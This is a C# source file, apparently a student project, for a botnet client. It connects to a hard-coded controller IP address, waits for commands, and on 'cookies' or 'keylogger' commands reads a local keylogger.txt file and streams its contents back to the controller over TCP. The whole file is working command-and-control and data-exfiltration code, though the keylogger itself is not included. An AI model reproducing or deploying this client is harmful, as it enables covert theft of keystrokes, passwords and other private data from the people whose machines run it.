using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace Client
{
    internal class Program
    {
        private const int BUFFER_SIZE = 1024;
        private const int PORT_NUMBER = 9669;

        static ASCIIEncoding encoding = new ASCIIEncoding();
        public static void sendFileSocket(TcpClient client)
        {
            byte[] dataTemp = File.ReadAllBytes(@"F:\\PBL4\\1910_Socket\\BotNetCl\\BotNetCl\\bin\\Debug\\keylogger.txt");
            byte[] dataLength = BitConverter.GetBytes(dataTemp.Length);

            int bufferSize = 1024;

            NetworkStream stream = client.GetStream();
            stream.Write(dataLength, 0, 4);

            int bytesSent = 0;
            int bytesLeft = dataTemp.Length;

            while (bytesLeft > 0)
            {
                int curDataSize = Math.Min(bufferSize, bytesLeft);

                stream.Write(dataTemp, bytesSent, curDataSize);

                bytesSent += curDataSize;
                bytesLeft -= curDataSize;
            }

        }
        static void Main(string[] args)
        {
            try
            {
                TcpClient client = new TcpClient();
                // 1. connect
                client.Connect("192.168.100.31", PORT_NUMBER);
                Stream stream = client.GetStream();
                byte[] data;
                while (true)
                {
                    data = new byte[BUFFER_SIZE];
                    stream.Read(data, 0, BUFFER_SIZE);
                    string command = encoding.GetString(data);

                    if (command.StartsWith("cookies"))
                    {
                        string url = command.Split('?')[1];
                        Console.WriteLine("a");
                        Console.WriteLine(url);
                        Console.WriteLine("b");
                        sendFileSocket(client);
                        Console.WriteLine("xong cookies");
                    }
                    else if (command.StartsWith("keylogger"))
                    {
                        string str = " keylogger tra ve";
                        data = encoding.GetBytes(str);
                        // stream.Write(data, 0, data.Length);
                        sendFileSocket(client);
                        Console.WriteLine("xong keylogger");
                    }
                    else if (command.StartsWith("exit"))
                    {
                        string str = "done";
                        data = encoding.GetBytes(str);
                        stream.Write(data, 0, data.Length);
                        Console.WriteLine("xong keylogger");
                        client.Close();

                    }
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex);
            }

            
        }
    }
}
